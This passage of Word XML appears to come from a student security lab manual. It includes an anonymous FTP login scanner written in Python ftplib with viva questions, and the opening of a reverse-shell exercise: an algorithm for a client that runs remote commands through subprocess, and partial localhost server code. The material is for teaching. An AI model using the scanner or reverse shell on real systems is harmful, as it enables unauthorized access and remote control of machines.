          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>UDP Ping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A83388D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. What is an ARP scan in Nmap?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="071D5371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B16BDD7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>An ARP scan sends Address Resolution Protocol requests to discover active</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027DA5E5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>devices on a local network and is very effective in LAN environments.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2951EBEE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D4C39C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:7</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B61005A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ANONYMOUS FTP SCANNER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03575DE2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49B94AD8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To build an anonymous ftp scanner using ftplib module in python.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64790C9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Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E5120A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>FTP Scanner:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78F1D5E8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A tool that automatically scans IPs/hosts for active FTP servers. It tests</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A82209" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>connectivity and credentials, reporting successful logins and vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D2E9DBD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ftplib:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00666036" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A built in Python library for working with the File Transfer Protocol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7285B787" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>(FTP). It allows connecting to FTP servers, logging in, listing directories, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EDEB3ED" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>transferring files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10A952F5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Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE03BE6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Import the `ftplib` module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1766B78E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Define a function that accepts a hostname.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9C839F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Inside the function, create an FTP connection to the hostname.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41725E14" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Attempt to log in with username `"anonymous"` and password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B8FEDA5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>`"anonymous"`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B9CBE9D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Store the server’s response from the login attempt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0749678D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>6. If the response contains `"230 Anonymous access granted"`, proceed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26164FE3" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>7. Print a success message with the hostname.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41036BC4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>8. Display the server’s welcome message and directory listing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4A0FCD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>9. If an exception occurs, print the error and a failure message.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234CFDE5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>10. Call the function with the desired hostname or IP address.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB50C89" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BAED583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Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D41D21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ftplib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31258B7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anonymousLogin(hostname):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0864C05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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C333DC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ftp = ftplib.FTP(hostname)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74D56D94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response = ftp.login('anonymous', 'anonymous')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AD9BDC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print(response)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E5159AC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if "230 Anonymous access granted" in response:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21E9FD0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print('\n[*] ' + str(hostname) +' FTP Anonymous Login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289D5581" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Succeeded.')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E60CC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print(ftp.getwelcome())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3285231B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ftp.dir()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A0A37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except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05ABF236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print(str(e))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3077BD4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print('\n[-] ' + str(hostname) +' FTP Anonymous Login Failed.')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CA47D4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hostname = 'ftp.be.debian.org'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D678ACD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>anonymousLogin(hostname)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1844AB2C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D678284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99139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991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84)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2706B907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47F5086D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus an anonymous ftp scanner using ftplib module was built and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E5110FF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>executed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2705C07C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="22B61137" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Viva Questions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DBF3F5A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is FTP?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CEE2766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76A6DBE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>FTP (File Transfer Protocol) is a network protocol used to transfer files between</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1900C4E7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>a client and a server over the Internet or a local network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D8E9235" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What is anonymous FTP login?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718BCF3F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1B9A957B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Anonymous FTP login allows users to access an FTP server without a personal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14655140" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>username and password, usually using "anonymous" as the username.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DEAB542" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. What is the purpose of an anonymous FTP scanner?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00385084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B757986" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>An anonymous FTP scanner checks whether a server permits anonymous login</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C3CB8B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>access, which can help identify security risks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56646EC0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Which port is commonly used by FTP?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65F98F7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32024E1B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>FTP uses port 21 as its default control port for communication between the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7B3548" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>client and the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB7CBF9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Which Python module is used to implement an FTP scanner?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1818C782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9AA749C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The ftplib module in Python is used to connect to and interact with FTP servers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4848DB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F1FDEA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from ftplib import FTP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14ACEE68" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4942C16E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210374E6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>REVERSE SHELL USING TCP SOCKETS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA87087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04F19DC6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To develop a program to reverse shell using TCP Sockets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="443E674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Introduction:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290D1165" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Reverse Shell:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75611A2B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A reverse shell is a TCP connection where a target machine connects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2935D297" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>back to a controller, allowing remote command execution.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DCC526" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TCP Sockets:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0083F190" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>TCP sockets are endpoints for a reliable, connection-based</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60D6E1F9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>communication channel between two machines over the Internet or a network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EA8044C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>They ensure ordered, error-checked data delivery.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB999B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Algorithm:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="314A2372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043EA7E8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Create a socket and bind it to host and port.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72BC1A70" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Start listening for incoming client connections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354F2C81" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Accept a connection when a client connects.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396B2768" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Send user-entered commands to the connected client.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED392C0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Receive and display the client’s output; close on `quit`.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B1C503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3FDFE832" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Create a socket and connect to the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BDB936B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Wait to receive a command from the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B32DC4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. If the command is `cd`, change the directory; if `quit`, close connection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51EF6D07" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Execute other commands using subprocess.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6936818E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Send the command output and current directory back to the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B151786" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="233461F3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Program Code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9E5AE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75122F86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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55B61F3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threading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D769D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host = '127.0.0.1'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51049BDF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port = 9999</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38DCA562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create_server_socket():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03C1859C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server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322F5F74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server.bind((host, port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6DBE4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server.listen(5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="332A960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print(f"[+] Listening on {host}:{port}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03CA15F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return server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AB83CA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handle_client(conn, addr):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08FCA44C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print(f"[+] Connection established with {addr[0]}:{addr[1]}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F37BD3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while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7862DD5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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03D338B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command = input(f"{addr[0]}@shell&gt; ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5932942C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if command.lower() == 'quit':</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="046B4CD5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>conn.send(command.encode())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236F29A0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>conn.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9C92F9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63BF4EF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if command.strip():</w:t>
      </w:r>
    </w:p>
